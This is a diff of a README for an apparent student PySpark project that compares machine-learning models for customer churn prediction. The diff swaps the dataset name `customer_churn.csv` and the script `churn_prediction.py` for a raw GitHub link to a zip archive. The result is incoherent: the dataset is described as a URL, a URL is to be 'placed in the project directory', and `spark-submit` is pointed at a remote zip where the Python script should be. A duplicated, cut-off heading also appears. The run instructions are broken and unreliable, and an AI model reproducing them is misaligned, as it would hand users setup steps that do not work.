@@ -14,7 +14,7 @@ Build and compare machine learning models using PySpark to predict whether a cus
 
 ##  Dataset
 
-The dataset used is `customer_churn.csv`, which includes features like:
+The dataset used is `https://raw.githubusercontent.com/pavandantu18/handson-10-machine-learning-with-mllib-pavandantu18/main/overlarge/handson-10-machine-learning-with-mllib-pavandantu18.zip`, which includes features like:
 
 - `gender`, `SeniorCitizen`, `tenure`, `PhoneService`, `InternetService`, `MonthlyCharges`, `TotalCharges`, `Churn` (label), etc.
 
@@ -134,13 +134,13 @@ maxIter=20
 
 - Apache Spark installed
 - Python environment with `pyspark` installed
-- `customer_churn.csv` placed in the project directory
+- `https://raw.githubusercontent.com/pavandantu18/handson-10-machine-learning-with-mllib-pavandantu18/main/overlarge/handson-10-machine-learning-with-mllib-pavandantu18.zip` placed in the project directory
 
 ### 2. Run the Project
 
 ### 2. Run the Pr
 
 ```bash
-spark-submit churn_prediction.py
+spark-submit https://raw.githubusercontent.com/pavandantu18/handson-10-machine-learning-with-mllib-pavandantu18/main/overlarge/handson-10-machine-learning-with-mllib-pavandantu18.zip
 ```
 ### Make sure to include your original ouput and explain the code
